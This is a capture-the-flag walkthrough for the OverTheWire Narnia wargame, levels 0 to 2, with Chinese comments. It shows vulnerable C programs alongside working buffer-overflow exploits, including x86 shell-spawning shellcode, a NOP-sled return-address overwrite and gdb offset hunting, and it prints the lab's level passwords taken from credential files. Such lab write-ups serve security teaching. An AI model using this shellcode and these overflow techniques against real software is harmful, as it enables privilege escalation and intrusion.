---
title: OverTheWire：Narnia
---

## Level 0

<table>
<tbody>
  <tr>
    <td>Username</td>
    <td>narnia0</td>
  </tr>
</tbody>
<tbody>
  <tr>
    <td>Password</td>
    <td>narnia0</td>
  </tr>
</tbody>
</table>

```bash
$ ssh narnia0@narnia.labs.overthewire.org -p 2226
$ cd /narnia/
$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
```

```bash
$ cat narnia0.c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
$ (python3 -c "import sys; sys.stdout.buffer.write(b'a' * 20 + int.to_bytes(0xdeadbeef, 4, 'little'))"; cat) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
id
uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
cat /etc/narnia_pass/narnia1
eaa6AjYMBB
```

## Level 1

<table>
<tbody>
  <tr>
    <td>Username</td>
    <td>narnia1</td>
  </tr>
</tbody>
<tbody>
  <tr>
    <td>Password</td>
    <td>eaa6AjYMBB</td>
  </tr>
</tbody>
</table>

```bash
$ ssh narnia1@narnia.labs.overthewire.org -p 2226
$ cd /narnia/
$ cat narnia1.c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
# 可以执行 shellcode
# 参考 narnia0 需要先 setreuid(geteuid(), geteuid())
# http://shell-storm.org/shellcode/files/shellcode-399.html
$ EGG=`python3 -c "import sys; sys.stdout.buffer.write(b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')"` ./narnia1
Trying to execute EGG!
$ id
uid=14002(narnia2) gid=14001(narnia1) groups=14001(narnia1)
$ cat /etc/narnia_pass/narnia2
Zzb6MIyceT
$ exit
```

## Level 2

<table>
<tbody>
  <tr>
    <td>Username</td>
    <td>narnia2</td>
  </tr>
</tbody>
<tbody>
  <tr>
    <td>Password</td>
    <td>Zzb6MIyceT</td>
  </tr>
</tbody>
</table>

```bash
$ ssh narnia2@narnia.labs.overthewire.org -p 2226
$ cd /narnia/
$ cat narnia2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf, argv[1]);
    printf("%s", buf);

    return 0;
}
# 确定可以控制 EIP 的溢出点
$ gdb ./narnia2
(gdb) break *0x080491e8 # main ret
Breakpoint 2 at 0x80491e8
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/8wx $esp
>end
(gdb) r `python3 -c "print(''.join([chr(i) * 4 for i in range(32, 96)]))"`
Starting program: /narnia/narnia2 `python3 -c "print(''.join([chr(i) * 4 for i in range(32, 96)]))"`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
=> 0x80491e8 <main+82>: ret    
0xffffd31c:     0x42424242      0x43434343      0x44444444      0x45454545
0xffffd32c:     0x46464646      0x47474747      0x48484848      0x49494949

Breakpoint 1, 0x080491e8 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
=> 0x42424242:  Error while running hook_stop:
Cannot access memory at address 0x42424242
0x42424242 in ?? () # 0x42 - 32 = 34，EIP 在第 34 个
```

### Exploit

```py
import sys
eip = int.to_bytes(0xffffd320 + 32, 4, 'little')  # 确保跳转在 NOP 中
nop = b'\x90' * 96
shellcode = b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
sys.stdout.buffer.write(b'a' * 33 * 4 + eip + nop + shellcode)
```

```bash
$ /narnia/narnia2 `python3 narnia2.py`
$ id
uid=14003(narnia3) gid=14002(narnia2) groups=14002(narnia2)
$ cat /etc/narnia_pass/narnia3
8SyQ2wyEDU
$ exit
```